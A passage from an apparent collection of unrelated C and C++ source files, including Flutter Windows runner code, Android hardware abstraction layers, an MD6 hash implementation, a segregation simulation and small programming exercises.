  \"secret\");\n  parser.addOption(passwordOption);\n\n  // VSCP level (-l, --level)\n  QCommandLineOption levelOption(QStringList() << \"l\"\n                                               << \"vscplevel\",\n                                 QApplication::translate(\"main\", \"Level\"),\n                                 \"(0|1)\",\n                                 \"1\");\n  parser.addOption(levelOption);\n\n  /*!\n   * Load flash from file.\n   * Load registers from MDF file.\n   * Simulation schema.\n   */\n\n  // Process the actual command line arguments given by the user\n  parser.process(app);\n\n  const QStringList args = parser.positionalArguments();\n  // source is args.at(0), destination is args.at(1)\n\n  QString iface = parser.value(interfaceOption);\n  // std::cout << \"Interface = \" << iface.toStdString() << std::endl;\n  app.m_interface = iface;\n  app.m_interface = app.m_interface.trimmed();\n  app.m_interface = app.m_interface.toLower();\n\n  QString cfg = parser.value(configOption);\n  // std::cout << \"Configuration = \" << cfg.toStdString() << std::endl;\n  app.m_config = cfg;\n  vscp_split(app.m_configVector, cfg.toStdString(), \";\");\n  if (app.m_configVector.size()) {\n    std::cout << \"Configuration = \" << app.m_configVector[0] << std::endl;\n  }\n\n  QString bootstr = parser.value(bootOption);\n  // std::cout << \"Host = \" << host.toStdString() << std::endl;\n  app.m_bootflag = vscp_readStringValue(bootstr.toStdString()); // app.BOOTLOADER;\n\n  QString hoststr = parser.value(hostOption);\n  // std::cout << \"Host = \" << host.toStdString() << std::endl;\n  app.m_host = hoststr;\n\n  QString portstr = parser.value(portOption);\n  // std::cout << \"Port = \" << port << std::endl;\n  app.m_port = vscp_readStringValue(portstr.toStdString());\n\n  QString userstr = parser.value(userOption);\n  // std::cout << \"User = \" << user.toStdString() << std::endl;\n  app.m_user = userstr;\n\n  QString passwo",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"DFN.hpp\"\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n\nusing namespace std;\n\nnamespace DFNLibrary{\n\nbool ImportFract(const string& filename,\n                 Fractures& fracture)\n{\n    ifstream file(filename);\n\n    if(file.fail())\n    {\n        cerr << \"File not found\" << endl;\n        return false;\n    }\n\n    string line;\n\n    //ignored line \"Number of Fractures\"\n    getline(file, line);\n\n    //number of fractures\n    getline(file, line);\n    istringstream convert(line);\n    convert >> fracture.numberFractures;\n\n    for (unsigned int i = 0; i < fracture.numberFractures; i++)\n    {\n        //ignored line \"FractureId; NumVertices\"\n        getline(file, line);\n\n        //fracture Id, NumVertices\n        getline(file, line);\n        replace(line.begin(), line.end(), ';', ' ');\n        istringstream convert(line);\n        unsigned int id;\n        unsigned int numVert;\n        convert >> id >> numVert;\n\n        //ignored line \"Vertices\"\n        getline(file, line);\n\n        //coordinates\n        string coord_x;\n        string coord_y;\n        string coord_z;\n\n        //x\n        getline(file, coord_x);\n        replace(coord_x.begin(), coord_x.end(), ';', ' ');\n        istringstream convertX(coord_x);\n\n        //y\n        getline(file, coord_y);\n        replace(coord_y.begin(), coord_y.end(), ';', ' ');\n        istringstream convertY(coord_y);\n\n        //z\n        getline(file, coord_z);\n        replace(coord_z.begin(), coord_z.end(), ';', ' ');\n        istringstream convertZ(coord_z);\n\n\n        double minX = 10e5;\n        double maxX = 0;\n        double minY = 10e5;\n        double maxY = 0;\n        double minZ = 10e5;\n        double maxZ = 0;\n\n        for (unsigned int j = 0; j < numVert; j++)\n        {\n            Vector3d coord;\n            convertX >> coord[0];\n            //assegnazione minimo e massimo della variabile x\n            if (minX > coord[0])\n                minX = coord[0];\n            if (maxX < coord[0])\n                maxX = coord[0];\n\n            convertY >> coord[1];\n            //assegnazione minimo e massimo della variabile y\n            if (minY > coord[1])\n                minY = coord[1];\n            if (maxY < coord[1])\n                maxY = coord[1];\n\n            convertZ >> coord[2];\n            //assegnazione minimo e massimo della variabile z\n            if (minZ > coord[2])\n                minZ = coord[2];\n            if (maxZ < coord[2])\n                maxZ = coord[2];\n\n            fracture.IDFracture[i].push_back(coord);\n\n        }\n        fracture.MinFract[i] = {minX, minY, minZ};\n        fracture.MaxFract[i] = {maxX, maxY, maxZ};\n    }\n    return true;\n}\n\nbool FilterFract(Fractures& fracture)\n{\n    //tolerance\n    float e = 1.0;\n    while ((1+e) > 1.0)\n        e /= 2.0;\n\n    for(unsigned int fract1 = 0; fract1 < fracture.numberFractures; fract1++)\n    {\n        for(unsigned int fract2 = (fract1 + 1); fract2 < fracture.numberFractures; fract2++)\n        {\n            if (((fracture.MinFract[fract1][0] >= fracture.MinFract[fract2][0] - e\n                  && fracture.MinFract[fract1][0] <= fracture.MaxFract[fract2][0] + e)\n                 || (fracture.MinFract[fract2][0] >= fracture.MinFract[fract1][0] - e\n                  && fracture.MinFract[fract2][0] <= fracture.MaxFract[fract1][0] + e))\n                &&\n                ((fracture.MinFract[fract1][1] >= fracture.MinFract[fract2][1] - e\n                  && fracture.MinFract[fract1][1] <= fracture.MaxFract[fract2][1] + e)\n                 || (fracture.MinFract[fract2][1] >= fracture.MinFract[fract1][1] - e\n                  && fracture.MinFract[fract2][1] <= fracture.MaxFract[fract1][1] + e))\n                &&\n                ((fracture.MinFract[fract1][2] >= fracture.MinFract[fract2][2] - e\n                  && fracture.MinFract[fract1][2] <= fracture.MaxFract[fract2][2] + e)\n                 || (fracture.MinFract[fract2][2] >= fracture.MinFract[fract1][2] - e\n                     && fracture.MinFract[fract2][2] <= fracture.MaxFract[fract1][2] + e))\n                )\n            {\n                fracture.IDFracturesComparable.push_back({fract1, fract2}); //IDFractures to compare\n            }\n        }\n\n    }\n}\n\n}\n\n\n",
    "/*\n * Copyright (C) 2018-2019 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.light@2.0-service.xiaomi_sm6250\"\n\n#include <log/log.h>\n\n#include \"Light.h\"\n\n#include <fstream>\n\n#define NOTIFICATION_LED       \"/sys/class/leds/white/\"\n\n#define BREATH          \"breath\"\n#define BRIGHTNESS      \"brightness\"\n\n#define MAX_LED_BRIGHTNESS    255\n\nnamespace {\n/*\n * Write value to path and close file.\n */\nstatic void set(std::string path, std::string value) {\n    std::ofstream file(path);\n\n    if (!file.is_open()) {\n        ALOGW(\"failed to write %s to %s\", value.c_str(), path.c_str());\n        return;\n    }\n\n    file << value;\n}\n\nstatic void set(std::string path, int value) {\n    set(path, std::to_string(value));\n}\n\nstatic uint32_t getBrightness(const LightState& state) {\n    uint32_t alpha, red, green, blue;\n\n    /*\n     * Extract brightness from AARRGGBB.\n     */\n    alpha = (state.color >> 24) & 0xFF;\n    red = (state.color >> 16) & 0xFF;\n    green = (state.color >> 8) & 0xFF;\n    blue = state.color & 0xFF;\n\n    /*\n     * Scale RGB brightness using Alpha brightness.\n     */\n    red = red * alpha / 0xFF;\n    green = green * alpha / 0xFF;\n    blue = blue * alpha / 0xFF;\n\n    return (77 * red + 150 * green + 29 * blue) >> 8;\n}\n\nstatic inline uint32_t scaleBrightness(uint32_t brightness, uint32_t maxBrightness) {\n    if (brightness == 0) {\n        return 0;\n    }\n\n    return (brightness - 1) * (maxBrightness - 1) / (0xFF - 1) + 1;\n}\n\nstatic inline uint32_t getScaledBrightness(const LightState& state, uint32_t maxBrightness) {\n    return scaleBrightness(getBrightness(state), maxBrightness);\n}\n\nstatic void handleNotification(const LightState& state) {\n    uint32_t whiteBrightness = getScaledBrightness(state, MAX_LED_BRIGHTNESS);\n\n    /* Disable breathing or blinking */\n    set(NOTIFICATION_LED BREATH, 0);\n    set(NOTIFICATION_LED BRIGHTNESS, 0);\n\n    if (!whiteBrightness) {\n        return;\n    }\n\n    switch (state.flashMode) {\n        case Flash::HARDWARE:\n        case Flash::TIMED:\n            /* Breathing */\n            set(NOTIFICATION_LED BREATH, 1);\n            break;\n        case Flash::NONE:\n        default:\n            set(NOTIFICATION_LED BRIGHTNESS, whiteBrightness);\n    }\n}\n\nstatic inline bool isStateLit(const LightState& state) {\n    return state.color & 0x00ffffff;\n}\n\nstatic inline bool isStateEqual(const LightState& first, const LightState& second) {\n    if (first.color == second.color && first.flashMode == second.flashMode &&\n            first.flashOnMs == second.flashOnMs &&\n            first.flashOffMs == second.flashOffMs &&\n            first.brightnessMode == second.brightnessMode) {\n        return true;\n    }\n\n    return false;\n}\n\n/* Keep sorted in the order of importance. */\nstatic std::vector<LightBackend> backends = {\n    { Type::ATTENTION, handleNotification },\n    { Type::NOTIFICATIONS, handleNotification },\n    { Type::BATTERY, handleNotification },\n};\n\nstatic LightStateHandler findHandler(Type type) {\n    for (const LightBackend& backend : backends) {\n        if (backend.type == type) {\n            return backend.handler;\n        }\n    }\n\n    return nullptr;\n}\n\nstatic LightState findLitState(LightStateHandler handler) {\n    LightState emptyState;\n\n    for (const LightBackend& backend : backends) {\n        if (backend.handler == handler) {\n            if (isStateLit(backend.state)) {\n                return backend.state;\n            }\n\n            emptyState = backend.state;\n        }\n    }\n\n    return emptyState;\n}\n\nstatic void updateState(Type type, const LightState& state) {\n    for (LightBackend& backend : backends) {\n        if (backend.type == type) {\n            backend.state = state;\n        }\n    }\n}\n\n}  // anonymous namespace\n\nnamespace android {\nnamespace hardware {\nnamespace light {\nnamespace V2_0 {\nnamespace implementation {\n\nReturn<Status> Light::setLight(Type type, const LightState& state) {\n    /* Lock global mutex until light state is updated. */\n    std::lock_guard<std::mutex> lock(globalLock);\n\n    LightStateHandler handler = findHandler(type);\n    if (!handler) {\n        /* If no handler has been found, then the type is not supported. */\n        return Status::LIGHT_NOT_SUPPORTED;\n    }\n\n    /* Find the old state of the current handler. */\n    LightState oldState = findLitState(handler);\n\n    /* Update the cached state value for the current type. */\n    updateState(type, state);\n\n    /* Find the new state of the curr",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"szachy_pl\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <random>\n#include <algorithm>\n#include <ctime>\n\nusing namespace std;\n\nconst int max_size = 1000;\nint tam_matriz, quant_agentes, limiar, matriz[max_size][max_size];\nfloat quant_vazio;\n\n// Inicializa\u00e7\u00e3o da matriz e coleta de dados\nvoid coletar(){\n  cout << \"Qual o tamanho da matriz?: \";\n  cin >> tam_matriz;\n\n  cout << \"Qual o numero de casas vazias? (Em porcentagem e inteiro): \";\n  cin >> quant_vazio;\n  quant_vazio = (quant_vazio / 100) * (tam_matriz * tam_matriz);\n\n  cout << \"Qual o limiar de tolerancia a diferenca? (Inteiro entre 1 e 8): \";\n  cin >> limiar;\n\n  quant_agentes = ((tam_matriz * tam_matriz) - quant_vazio) / 2;\n}\n\n// Preenchimento da matriz com os dados coletados\nvoid preencher(){\n  int count_vazio, count_agente, matriz_aux[tam_matriz * tam_matriz];\n  count_vazio = 0;\n  count_agente = 0;\n\n  // Preenche uma matriz unidimensional com os valores\n  for (int i = 0; i < (tam_matriz * tam_matriz); i++){\n    if (count_vazio < quant_vazio){\n      matriz_aux[i] = 0;\n      count_vazio++;\n    }\n    else if (count_agente < quant_agentes){\n      matriz_aux[i] = 1;\n      count_agente++;\n    }\n    else{\n      matriz_aux[i] = 2;\n    }\n  }\n\n  // Embaralhar a matriz preenchida\n  srand(time(0));\n  random_shuffle(matriz_aux, matriz_aux + (tam_matriz * tam_matriz));\n\n  // Preenche a matriz bidimensional com os valores embaralhados\n  for (int i = 0; i < (tam_matriz); i++){\n    for (int j = 0; j < (tam_matriz); j++){\n      matriz[i][j] = matriz_aux[i * tam_matriz + j];\n    }\n  }\n\n  // Imprime a matriz embaralhada\n  cout << \"Mapa inicial (Embaralhado):\" << endl;\n  for (int i = 0; i < tam_matriz; i++){\n    for (int j = 0; j < tam_matriz; j++){\n      cout << matriz[i][j] << \" \";\n    }\n    cout << endl;\n  }\n  cout << endl\n       << endl;\n}\n\n// Percorre a vizinhan\u00e7a de um agente\nbool percorrer(int agente, int x, int y){\n  int count_diferente = 0;\n  for (int i = -1; i <= 1; i++){\n    for (int j = -1; j <= 1; j++){\n      if (matriz[x + i][y + j] != agente && matriz[x + i][y + j] != 0){\n        count_diferente++;\n      }\n    }\n  }\n  if (count_diferente > limiar){\n    return true;\n  }\n  else{\n    return false;\n  }\n}\n\n// Calcula a satisfa\u00e7\u00e3o dos agentes dentro da matriz\nvoid satisfacao(){\n  bool insatisfeito;\n  int agente;\n\n  // Percorre toda a parte interna da matriz, ignorando as primeiras e \u00faltimas linhas e colunas\n  for (int i = 1; i <= tam_matriz - 2; i++){\n    for (int j = 1; j <= tam_matriz - 2; j++){\n      if (matriz[i][j] != 0){\n        agente = matriz[i][j];\n        insatisfeito = percorrer(agente, i, j);\n\n        // Altera\u00e7\u00f5es caso o agente esteja insatisfeito\n        if (insatisfeito == true){\n          for (int k = 0; k < tam_matriz; k++){\n            for (int l = 0; l < tam_matriz; l++){\n              if (matriz[k][l] == 0){\n                matriz[k][l] = agente;\n                matriz[i][j] = 0;\n                goto sair_do_loop;\n              }\n            }\n          }\n        }\n        sair_do_loop:;\n      }\n    }\n  }\n}\n\nint main()\n{\n  coletar();\n  preencher();\n  satisfacao();\n\n  // Imprime a matriz ap\u00f3s as altera\u00e7\u00f5es\n  cout << \"Novo mapa (Organizado):\" << endl;\n  for (int i = 0; i < tam_matriz; i++){\n    for (int j = 0; j < tam_matriz; j++){\n      cout << matriz[i][j] << \" \";\n    }\n    cout << endl;\n  }\n}",
    "//\n// Created by DELL on 5/2/2024.\n//\n#include<iostream>\nusing namespace std;\n\ntemplate<class t>\nclass stack\n{\n    t * arr;\n    int top;\npublic:\n    stack(){\n        top=-1;\n        arr=new t[100];\n    }\n    void push(t x)\n    {\n        top++;\n        arr[top]=x;\n    }\n    void pop()\n    {   if(!isempty())\n        {\n            top--;\n        }\n\n    }\n    bool isempty()\n    {\n        return top==-1;\n    }\n    t topele()\n    {\n        if(!isempty())\n            return arr[top];\n        return -1;\n    }\n    int length()\n    {\n        return top+1;\n    }\n};\nbool pairs(char o,char c)\n{\n    if ((o == '(' && c == ')')||(o == '{' && c == '}')||(o == '[' && c == ']')){\n        return true;\n    }\n    return false;\n}\nbool balanced(string x)\n{\n    stack<char> open;\n\n    for (int i = 0; i < x.length(); ++i) {\n        if(x[i]=='('||x[i]=='{'||x[i]=='[')\n            open.push(x[i]);\n        else if(x[i]==')'||x[i]=='}'||x[i]==']')\n        {\n            if(open.isempty()||pairs(open.topele(),x[i]) == false)\n                return false;\n            else\n            {\n                open.pop();\n            }\n        }\n    }\n    if(open.isempty())\n        return true;\n    else\n        return false;\n\n}\nint main()\n{\n    string b;\n    cin>>b;\n    cout<<balanced(b);\n\n}",
    "/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"Sensors.h\"\n#include \"convert.h\"\n#include \"multihal.h\"\n\n#include <android-base/logging.h>\n\n#include <sys/stat.h>\n\nnamespace android {\nnamespace hardware {\nnamespace sensors {\nnamespace V1_0 {\nnamespace implementation {\n\n/*\n * If a multi-hal configuration file exists in the proper location,\n * return true indicating we need to use multi-hal functionality.\n */\nstatic bool UseMultiHal() {\n    const std::string& name = MULTI_HAL_CONFIG_FILE_PATH;\n    struct stat buffer;\n    return (stat(name.c_str(), &buffer) == 0);\n}\n\nstatic Result ResultFromStatus(status_t err) {\n    switch (err) {\n        case OK:\n            return Result::OK;\n        case PERMISSION_DENIED:\n            return Result::PERMISSION_DENIED;\n        case NO_MEMORY:\n            return Result::NO_MEMORY;\n        case BAD_VALUE:\n            return Result::BAD_VALUE;\n        default:\n            return Result::INVALID_OPERATION;\n    }\n}\n\nSensors::Sensors() : mInitCheck(NO_INIT), mSensorModule(nullptr), mSensorDevice(nullptr) {\n    status_t err = OK;\n    if (UseMultiHal()) {\n        mSensorModule = ::get_multi_hal_module_info();\n    } else {\n        err = hw_get_module(SENSORS_HARDWARE_MODULE_ID, (hw_module_t const**)&mSensorModule);\n    }\n    if (mSensorModule == NULL) {\n        err = UNKNOWN_ERROR;\n    }\n\n    if (err != OK) {\n        LOG(ERROR) << \"Couldn't load \" << SENSORS_HARDWARE_MODULE_ID << \" module (\"\n                   << strerror(-err) << \")\";\n\n        mInitCheck = err;\n        return;\n    }\n\n    err = sensors_open_1(&mSensorModule->common, &mSensorDevice);\n\n    if (err != OK) {\n        LOG(ERROR) << \"Couldn't open device for module \" << SENSORS_HARDWARE_MODULE_ID << \" (\"\n                   << strerror(-err) << \")\";\n\n        mInitCheck = err;\n        return;\n    }\n\n    // Require all the old HAL APIs to be present except for injection, which\n    // is considered optional.\n    CHECK_GE(getHalDeviceVersion(), SENSORS_DEVICE_API_VERSION_1_3);\n\n    if (getHalDeviceVersion() == SENSORS_DEVICE_API_VERSION_1_4) {\n        if (mSensorDevice->inject_sensor_data == nullptr) {\n            LOG(ERROR) << \"HAL specifies version 1.4, but does not implement inject_sensor_data()\";\n        }\n        if (mSensorModule->set_operation_mode == nullptr) {\n            LOG(ERROR) << \"HAL specifies version 1.4, but does not implement set_operation_mode()\";\n        }\n    }\n\n    mInitCheck = OK;\n}\n\nstatus_t Sensors::initCheck() const {\n    return mInitCheck;\n}\n\nReturn<void> Sensors::getSensorsList(getSensorsList_cb _hidl_cb) {\n    hidl_vec<SensorInfo> out = getFixedUpSensorList();\n\n    _hidl_cb(out);\n\n    return Void();\n}\n\nint Sensors::getHalDeviceVersion() const {\n    if (!mSensorDevice) {\n        return -1;\n    }\n\n    return mSensorDevice->common.version;\n}\n\nReturn<Result> Sensors::setOperationMode(OperationMode mode) {\n    if (getHalDeviceVersion() < SENSORS_DEVICE_API_VERSION_1_4 ||\n        mSensorModule->set_operation_mode == nullptr) {\n        return Result::INVALID_OPERATION;\n    }\n    return ResultFromStatus(mSensorModule->set_operation_mode((uint32_t)mode));\n}\n\nReturn<Result> Sensors::activate(int32_t sensor_handle, bool enabled) {\n    return ResultFromStatus(mSensorDevice->activate(\n            reinterpret_cast<sensors_poll_device_t*>(mSensorDevice), sensor_handle, enabled));\n}\n\nReturn<void> Sensors::poll(int32_t maxCount, poll_cb _hidl_cb) {\n    hidl_vec<Event> out;\n    hidl_vec<SensorInfo> dynamicSensorsAdded;\n\n    std::unique_ptr<sensors_event_t[]> data;\n    int err = android::NO_ERROR;\n\n    {  // scope of reentry lock\n\n        // This enforces a single client, meaning that a maximum of one client can call poll().\n        // If this function is re-entred, it means that we are stuck in a state that may prevent\n        // the system from proceeding normally.\n        //\n        // Exit and let the system restart the sensor-hal-implementation hidl service.\n        //\n        // This function must not call _hidl_cb(...) or return until there is no risk of blocking.\n        std::unique_lock<std::mutex> lock(mPollLock, std::try_to_lock);\n        if (!lock.owns_lock()) {\n            // cannot get the lock, hidl service will go into deadlock if it is not restarted.\n            // This is guaranteed to not trigger in passthrough mode.\n            LOG(ERROR)\n                    << \"ISensors::poll() re-entry. I do not know what to do except killing ",
    "#include <cstdlib>\n#include <cstring>\n#include \"md6.h\"\n\n// Define constants\n#define w md6_w\n#define n md6_n\n#define c md6_c\n#define b md6_b\n#define v md6_v\n#define u md6_u\n#define k md6_k\n#define q md6_q\n\nint RL[16][2] = {\n        {10, 11}, {5, 24}, {13, 9}, {10, 16}, {11, 15}, {12, 9},\n        {2, 27}, {7, 15}, {14, 6}, {15, 2}, {7, 29}, {13, 8},\n        {11, 15}, {7, 5}, {6, 31}, {12, 9}\n};\n\n// Main compression loop\nstatic void md6_main_compression_loop(md6_word *A, int r) {\n    md6_word x, S = 0x0123456789abcdefULL;\n    int i = n;\n\n    for (int j = 0; j < r * c; j += c) {\n        for (int step = 0; step < 16; step++) {\n            x = S;\n            x ^= A[i + step - 89];\n            x ^= A[i + step - 17];\n            x ^= (A[i + step - 18] & A[i + step - 21]);\n            x ^= (A[i + step - 31] & A[i + step - 67]);\n            x ^= (x >> RL[step][0]);\n            A[i + step] = x ^ (x << RL[step][1]);\n        }\n        S = (S << 1) ^ (S >> (w - 1)) ^ (S & 0x7311c2812425cfa0ULL);\n        i += 16;\n    }\n}\n\n// Compression function\nstatic int md6_compress(md6_word *C, md6_word *N, int r, md6_word *A) {\n    if (!N || !C || r < 0 || r > md6_max_r) return MD6_BAD_r;\n\n    md6_word *A_as_given = A;\n    if (!A) {\n        A = (md6_word *) calloc(r * c + n, sizeof(md6_word));\n        if (!A) return MD6_OUT_OF_MEMORY;\n    }\n\n    memcpy(A, N, n * sizeof(md6_word));\n    md6_main_compression_loop(A, r);\n    memcpy(C, A + (r - 1) * c + n, c * sizeof(md6_word));\n\n    if (!A_as_given) {\n        memset(A, 0, (r * c + n) * sizeof(md6_word));\n        free(A);\n    }\n\n    return MD6_SUCCESS;\n}\n\n// Create control word\nstatic md6_control_word md6_make_control_word(int r, int L, int z, int p, int keylen, int d) {\n    return (((md6_control_word) 0 << 60) |\n            ((md6_control_word) r << 48) |\n            ((md6_control_word) L << 40) |\n            ((md6_control_word) z << 36) |\n            ((md6_control_word) p << 20) |\n            ((md6_control_word) keylen << 12) |\n            (md6_control_word) d);\n}\n\n// Standard compress function\nint md6_standard_compress(md6_word *C, const md6_word *Q, const md6_word *K, int ell, int i, int r, int L, int z,\n                                 int p, int keylen, int d, md6_word *B) {\n    if (!C || !B || !K || !Q) return MD6_NULL_C;\n    if (r < 0 || r > md6_max_r || L < 0 || L > 255 || ell < 0 || ell > 255\n        || p < 0 || p > b * w || d <= 0 || d > c * w / 2)\n        return MD6_BAD_r;\n\n    md6_word N[md6_n];\n    md6_word A[5000];\n\n    // Pack\n    int ni = 0;\n\n    for (int j = 0; j < q; j++) N[ni++] = Q[j];\n    for (int j = 0; j < k; j++) N[ni++] = K[j];\n\n    md6_nodeID U = ((md6_nodeID) ell << 56) | i;\n    memcpy((unsigned char *) &N[ni], &U, min(u * (w / 8), sizeof(md6_nodeID)));\n    ni += u;\n\n    md6_control_word V = md6_make_control_word(r, L, z, p, keylen, d);\n    memcpy((unsigned char *) &N[ni], &V, min(v * (w / 8), sizeof(md6_control_word)));\n    ni += v;\n\n    memcpy(N + ni, B, b * sizeof(md6_word));\n\n    return md6_compress(C, N, r, A);\n}\n",
    "#include <stdlib.h>\n\n#include <iostream>\n#include <string>  // Add this line\n#include <unordered_set>\n#include <vector>\n\nusing namespace std;\n\n/*********************Attmept 1********************/\n\n// class Solution {\n//  public:\n//   int numUniqueEmails(vector<string>& emails) {\n//     // Convert all emails to correct format\n//     int numEmails = emails.size();\n//     for (int i = 0; i < numEmails; i++) {\n//       int sizeString = emails[i].size();\n//       string curr = emails[i];\n//       for (int j = 0; j < sizeString; j++) {\n//         if (curr[j] == '.' || curr[j] == '+') {\n//           curr[j] = '\\0';\n//         }\n//       }\n\n//       for (int j = 0; j < sizeString; j++) {\n//         if (curr[j] == '\\0' && j < sizeString - 1) {\n//           bool shift = true;\n//           int k = j;\n//           if (k + 1 < sizeString) {\n//             while (shift) {\n//               if (k + 1 < sizeString) {\n//                 curr[k] = curr[k + 1];\n//                 if (k + 1 == sizeString) curr[k + 1] = '\\0';\n//               } else\n//                 shift = false;\n//             }\n//           }\n//         }\n//       }\n//       emails[i] = curr;\n//     }\n\n//     // Count unique addresses\n//     int unique = 0;\n//     for (int i = 0; i < numEmails; i++) {\n//       bool duplicate = false;\n//       string curr = emails[i];\n//       for (int j = 0; j < numEmails; j++) {\n//         if (j != i) {\n//           if (curr == emails[j]) duplicate = true;\n//         }\n//       }\n//       if (!duplicate) unique++;\n//     }\n//     return unique;\n//   }\n// };\n\n// Function is too complex so it exceeds time limit\n\n/*********************End of Attmept 1********************/\n\n/*********************Attmept 2********************/\nclass Solution {\n public:\n  int numUniqueEmails(vector<string>& emails) {\n    int vecSize = emails.size();\n    unordered_set<string> uniqueEmails;\n\n    for (int i = 0; i < vecSize; i++) {\n      string curr = emails[i];\n      int strSize = curr.size();\n      string newEmail = \"\";\n      int j = 0;\n      char iterator = curr[0];\n\n      // Get the name\n      while (iterator != '@' && iterator != '+') {\n        if (iterator == '.') {\n          j++;\n          iterator = curr[j];\n        } else {\n          newEmail += iterator;  // Concatenate the strings\n          j++;\n          iterator = curr[j];\n        }\n      }\n\n      // Get the domain\n      iterator = curr[j];\n      bool postAt = false;\n\n      while (iterator != '/0') {\n        if (iterator == '@') postAt = true;\n\n        if (!postAt) {\n          j++;\n          iterator = curr[j];\n        } else {\n          newEmail += curr[j];\n          j++;\n          iterator = curr[j];\n        }\n      }\n\n      // newEmail is fully formatted\n      auto search = uniqueEmails.find(newEmail);\n      if (search == uniqueEmails.end()) {\n        uniqueEmails.insert(newEmail);\n      }\n    }\n\n    return uniqueEmails.size();\n  }\n};\n\n/*********************End of attempt 2*************/\n\nint main() {\n  vector<string> emails = {\"test.email+alex@leetcode.com\",\n                           \"test.e.mail+bob.cathy@leetcode.com\",\n                           \"testemail+david@lee.tcode.com\"};\n  Solution sol;\n  int num = sol.numUniqueEmails(emails);\n  cout << num << endl;\n  return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// 